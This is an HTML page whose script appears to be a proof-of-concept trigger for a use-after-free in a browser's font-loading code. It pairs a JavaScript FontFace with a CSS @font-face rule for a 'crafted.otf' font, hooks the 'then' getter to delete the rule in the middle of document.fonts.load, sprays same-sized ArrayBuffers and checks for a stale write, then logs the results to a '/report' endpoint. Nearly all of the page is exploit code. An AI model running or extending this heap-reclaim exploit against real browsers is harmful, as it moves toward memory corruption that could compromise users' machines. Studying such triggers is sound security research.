<!doctype html><html><head><meta charset="utf-8"><title>CSF upstream trigger</title>
<style>body{margin:0;padding:18px;background:#0b0e14;color:#d7dce5;font-family:system-ui}
#o{white-space:pre-wrap;font:12px/1.5 ui-monospace,monospace;color:#9fb4d6}</style>
<style id="inv">x{}</style></head>
<body><div id="s">CSF</div><pre id="o"></pre><script>
var out=document.getElementById("o"),LOG=[];
function send(){fetch("/report",{method:"POST",headers:{"content-type":"application/json"},body:JSON.stringify({ua:navigator.userAgent,lines:LOG})}).catch(function(){});}
var _rt=0;function log(s){out.textContent+=s+"\n";LOG.push(s);if(_rt)clearTimeout(_rt);_rt=setTimeout(send,300);}
function sleep(ms){return new Promise(function(r){setTimeout(r,ms);});}
async function run(){
  log("UA: "+navigator.userAgent);
  // A: JS face with a local source (the sync-candidate)
  var A;
  try { A = new FontFace("a","local(Helvetica)",{unicodeRange:"U+0041"}); } catch(e){ log("A ctor: "+e.message); return; }
  document.fonts.add(A);
  void A.loaded;
  // B: RULE ONLY — never looked up in JS, so no wrapper Ref
  var st = document.createElement("style");
  st.textContent = "@font-face{font-family:b;src:url(/font/crafted.otf);unicode-range:U+0042;}";
  document.head.append(st);
  void document.body.offsetHeight;
  var fired=false, spray=[];
  var old = FontFace.prototype.then;
  Object.defineProperty(FontFace.prototype,"then",{configurable:true,get:function(){
    if(this!==A) return undefined;
    fired=true; log("getter fired (A) — deleting B rule");
    st.remove(); void document.body.offsetHeight;
    for(var i=0;i<0x80;i++){var ab=new ArrayBuffer(0xb8),dv=new DataView(ab);try{dv.setUint32(8,1,true);dv.setUint8(0x7a,3);}catch(e){}spray.push(ab);}
    return undefined;}});
  log("calling document.fonts.load('1em a, b','AB')");
  var r;
  try { r = document.fonts.load("1em a, b","AB"); } catch(e){ log("load threw: "+e.message); }
  log("load returned; fired="+fired+" (sync="+(fired?"YES":"no")+")");
  await sleep(1200);
  Object.defineProperty(FontFace.prototype,"then",{configurable:true,value:old});
  log("settled; fired="+fired+" sprayed="+spray.length);
  var hit=null;
  for(var j=0;j<spray.length;j++){var u=new Uint8Array(spray[j]),dirty=false;
    for(var k=0;k<u.length;k++){if(u[k]!==0&&k!==8&&k!==9&&k!==10&&k!==11&&k!==0x7a){dirty=true;break;}}
    var rc=new DataView(spray[j]).getUint32(8,true);
    if(dirty||rc===2){hit=spray[j];break;}}
  if(hit){log("HIT — stale write landed in spray");}else{log("no reclaim");}
  log("done");
}
run();
</script></body></html>
